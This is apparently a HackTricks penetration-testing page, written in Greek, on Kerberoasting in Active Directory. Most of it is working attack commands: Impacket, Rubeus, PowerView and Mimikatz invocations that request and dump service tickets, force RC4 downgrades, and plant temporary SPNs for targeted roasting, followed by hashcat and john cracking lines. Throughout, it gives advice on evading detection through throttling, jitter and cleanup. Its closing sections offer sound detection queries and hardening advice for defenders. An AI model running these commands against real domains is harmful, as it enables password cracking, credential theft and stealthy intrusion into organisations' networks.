# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση TGS tickets, συγκεκριμένα αυτών που σχετίζονται με υπηρεσίες που τρέχουν υπό λογαριασμούς χρηστών στο Active Directory (AD), εξαιρουμένων των λογαριασμών υπολογιστών. Η κρυπτογράφηση αυτών των tickets χρησιμοποιεί κλειδιά που προέρχονται από τους κωδικούς πρόσβασης των χρηστών, επιτρέποντας offline credential cracking. Η χρήση λογαριασμού χρήστη ως υπηρεσίας υποδεικνύεται από μια μη κενή ιδιότητα ServicePrincipalName (SPN).

Οποιοσδήποτε αυθεντικοποιημένος χρήστης του domain μπορεί να ζητήσει TGS tickets, οπότε δεν απαιτούνται ειδικά προνόμια.

### Βασικά Σημεία

- Στοχεύει σε TGS tickets για υπηρεσίες που τρέχουν υπό λογαριασμούς χρηστών (δηλ. λογαριασμοί με SPN ορισμένο· όχι λογαριασμοί υπολογιστών).
- Τα tickets κρυπτογραφούνται με κλειδί που παράγεται από τον κωδικό πρόσβασης του service account και μπορούν να crack offline.
- Δεν απαιτούνται αυξημένα προνόμια — οποιοσδήποτε αυθεντικοποιημένος λογαριασμός μπορεί να ζητήσει TGS tickets.

> [!WARNING]
> Τα περισσότερα δημόσια εργαλεία προτιμούν να ζητούν RC4-HMAC (etype 23) service tickets επειδή είναι ταχύτερα για crack σε σχέση με τα AES. RC4 TGS hashes ξεκινούν με `$krb5tgs$23$*`, AES128 με `$krb5tgs$17$*`, και AES256 με `$krb5tgs$18$*`. Ωστόσο, πολλά περιβάλλοντα κινούνται προς AES-only. Μην υποθέτετε ότι μόνο το RC4 είναι σχετικό.
> Επίσης, αποφύγετε το “spray-and-pray” roasting. Η προεπιλεγμένη kerberoast του Rubeus μπορεί να κάνει query και να ζητήσει tickets για όλα τα SPNs και είναι θορυβώδης. Πρώτα κάντε enumeration και στοχεύστε ενδιαφέροντες principals.

### Service account secrets & Kerberos crypto cost

Πολλές υπηρεσίες εξακολουθούν να τρέχουν υπό λογαριασμούς χρηστών με χειροκίνητα διαχειριζόμενους κωδικούς πρόσβασης. Το KDC κρυπτογραφεί τα service tickets με κλειδιά που παράγονται από αυτούς τους κωδικούς και παραδίδει το ciphertext σε οποιονδήποτε authenticated principal, οπότε το kerberoasting παρέχει απεριόριστες offline guesses χωρίς lockouts ή DC telemetry. Ο τρόπος κρυπτογράφησης καθορίζει τον προϋπολογισμό για cracking:

| Λειτουργία | Παράγωγη κλειδιού | Τύπος κρυπτογράφησης | Περίπου throughput RTX 5090* | Σημειώσεις |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 με 4,096 επαναλήψεις και ένα per-principal salt που παράγεται από το domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Το salt αποκλείει rainbow tables αλλά επιτρέπει ακόμα γρήγορο cracking σύντομων κωδικών. |
| RC4 + NT hash | Μία MD4 του κωδικού (unsalted NT hash); Kerberos προσθέτει μόνο ένα 8-byte confounder ανά ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× ταχύτερο από AES; οι attackers αναγκάζουν RC4 όποτε `msDS-SupportedEncryptionTypes` το επιτρέπει. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Ο confounder του RC4 μόνο τυχαίοςποιεί το keystream· δεν προσθέτει εργασία ανά guess. Εκτός αν οι service accounts βασίζονται σε τυχαία secrets (gMSA/dMSA, machine accounts, ή vault-managed strings), η ταχύτητα του compromise καθορίζεται καθαρά από τον προϋπολογισμό GPU. Η επιβολή AES-only etypes αφαιρεί την υποβάθμιση των billion-guesses-per-second, αλλά οι αδύναμοι human passwords εξακολουθούν να πέφτουν με PBKDF2.

### Επίθεση

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Εργαλεία με πολλές λειτουργίες που περιλαμβάνουν ελέγχους kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Καταγράψτε kerberoastable χρήστες
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Τεχνική 1: Ζητήστε TGS και dump από τη μνήμη
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Τεχνική 2: Αυτόματα εργαλεία
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Ένα αίτημα TGS δημιουργεί το Windows Security Event 4769 (Ζητήθηκε Kerberos service ticket).

### OPSEC και περιβάλλοντα AES-only

- Ζητήστε RC4 εσκεμμένα για λογαριασμούς χωρίς AES:
- Rubeus: `/rc4opsec` χρησιμοποιεί tgtdeleg για να απαριθμήσει λογαριασμούς χωρίς AES και να αιτηθεί RC4 εισητήρια υπηρεσίας.
- Rubeus: `/tgtdeleg` με kerberoast προκαλεί επίσης αιτήματα RC4 όπου είναι δυνατό.
- Roast λογαριασμούς AES-only αντί να αποτύχει σιωπηλά:
- Rubeus: `/aes` απαριθμεί λογαριασμούς με ενεργοποιημένο AES και αιτεί AES εισητήρια υπηρεσίας (etype 17/18).
- Αν ήδη κατέχετε ένα TGT (PTT ή από .kirbi), μπορείτε να χρησιμοποιήσετε `/ticket:<blob|path>` με `/spn:<SPN>` ή `/spns:<file>` και να παραλείψετε το LDAP.
- Στοχοποίηση, throttling και λιγότερος θόρυβος:
- Χρησιμοποιήστε `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` και `/jitter:<1-100>`.
- Φιλτράρετε για πιθανώς αδύναμους κωδικούς με `/pwdsetbefore:<MM-dd-yyyy>` (παλαιότεροι κωδικοί) ή στοχεύστε προνομιούχες OUs με `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Σπάσιμο
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Επιμονή / Κατάχρηση

Εάν έχετε έλεγχο ή μπορείτε να τροποποιήσετε έναν λογαριασμό, μπορείτε να τον κάνετε kerberoastable προσθέτοντας ένα SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Υποβάθμισε έναν λογαριασμό για να ενεργοποιήσεις το RC4 για ευκολότερο cracking (απαιτεί δικαιώματα εγγραφής στο αντικείμενο-στόχο):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Στοχευμένο Kerberoast μέσω GenericWrite/GenericAll σε χρήστη (προσωρινό SPN)

Όταν το BloodHound δείχνει ότι έχετε έλεγχο πάνω σε ένα αντικείμενο χρήστη (π.χ. GenericWrite/GenericAll), μπορείτε αξιόπιστα να "targeted-roast" αυτόν τον συγκεκριμένο χρήστη ακόμα κι αν δεν έχει επί του παρόντος κανένα SPN:

- Προσθέστε ένα προσωρινό SPN στον ελεγχόμενο χρήστη για να τον κάνετε roastable.
- Ζητήστε ένα TGS-REP κρυπτογραφημένο με RC4 (etype 23) για αυτό το SPN για να ευνοήσετε το cracking.
- Crack το `$krb5tgs$23$...` hash με hashcat.
- Αφαιρέστε το SPN για να μειώσετε το footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py αυτοματοποιεί add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crack την έξοδο με hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: η προσθήκη/αφαίρεση SPNs παράγει αλλαγές στον κατάλογο (Event ID 5136/4738 στον στοχευόμενο χρήστη) και το αίτημα TGS δημιουργεί Event ID 4769. Σκεφτείτε throttling και άμεσο καθαρισμό.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (παρωχημένο σε μερικές διανομές)
- `rdate -n <DC_IP>`

### Kerberoast χωρίς λογαριασμό στο domain (AS-requested STs)

Τον Σεπτέμβριο του 2022, ο Charlie Clark έδειξε ότι αν ένας principal δεν απαιτεί pre-authentication, είναι δυνατό να αποκτηθεί ένα service ticket μέσω ενός κατασκευασμένου KRB_AS_REQ αλλάζοντας το sname στο σώμα του αιτήματος, αποκτώντας ουσιαστικά ένα service ticket αντί για TGT. Αυτό μοιάζει με AS-REP roasting και δεν απαιτεί έγκυρα domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Πρέπει να παρέχετε λίστα χρηστών, επειδή χωρίς έγκυρα credentials δεν μπορείτε να κάνετε query στο LDAP με αυτήν την τεχνική.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Σχετικά

Εάν στοχεύετε AS-REP roastable users, δείτε επίσης:

{{#ref}}
asreproast.md
{{#endref}}

### Ανίχνευση

Το Kerberoasting μπορεί να είναι αθόρυβο. Αναζητήστε Event ID 4769 από DCs και εφαρμόστε φίλτρα για να μειώσετε τον θόρυβο:

- Εξαιρέστε το όνομα υπηρεσίας `krbtgt` και τα ονόματα υπηρεσιών που τελειώνουν σε `$` (λογαριασμοί υπολογιστών).
- Εξαιρέστε αιτήσεις από λογαριασμούς υπολογιστών (`*$$@*`).
- Μόνο επιτυχείς αιτήσεις (Failure Code `0x0`).
- Παρακολουθήστε τους τύπους κρυπτογράφησης: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Μην ειδοποιείτε μόνο για `0x17`.

Παράδειγμα PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Επιπλέον ιδέες:

- Καθορίστε baseline της κανονικής χρήσης SPN ανά host/user· ειδοποιήστε για μεγάλες αιχμές από διακριτά αιτήματα SPN από έναν μόνο principal.
- Επισημάνετε ασυνήθη χρήση RC4 σε domains που έχουν ενισχυθεί με AES.

### Αντιμετώπιση / Σκληρυνση

- Χρησιμοποιήστε gMSA/dMSA ή machine accounts για υπηρεσίες. Τα managed accounts έχουν τυχαίους κωδικούς 120+ χαρακτήρων και αλλάζουν αυτόματα, καθιστώντας το offline cracking μη πρακτικό.
- Επιβάλετε AES στα service accounts ρυθμίζοντας το `msDS-SupportedEncryptionTypes` σε AES-only (decimal 24 / hex 0x18) και στη συνέχεια περιστρέψτε τον κωδικό ώστε να προκύψουν τα AES keys.
- Όπου είναι δυνατό, απενεργοποιήστε το RC4 στο περιβάλλον σας και παρακολουθήστε για απόπειρες χρήσης RC4. Σε DCs μπορείτε να χρησιμοποιήσετε την τιμή μητρώου `DefaultDomainSupportedEncTypes` για να καθοδηγήσετε τις προεπιλογές για λογαριασμούς που δεν έχουν ορισμένο το `msDS-SupportedEncryptionTypes`. Δοκιμάστε διεξοδικά.
- Αφαιρέστε περιττά SPNs από user accounts.
- Χρησιμοποιήστε μακρείς, τυχαίους κωδικούς για service accounts (25+ chars) εάν τα managed accounts δεν είναι δυνατά· απαγορεύστε κοινούς κωδικούς και πραγματοποιείτε τακτικό audit.

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
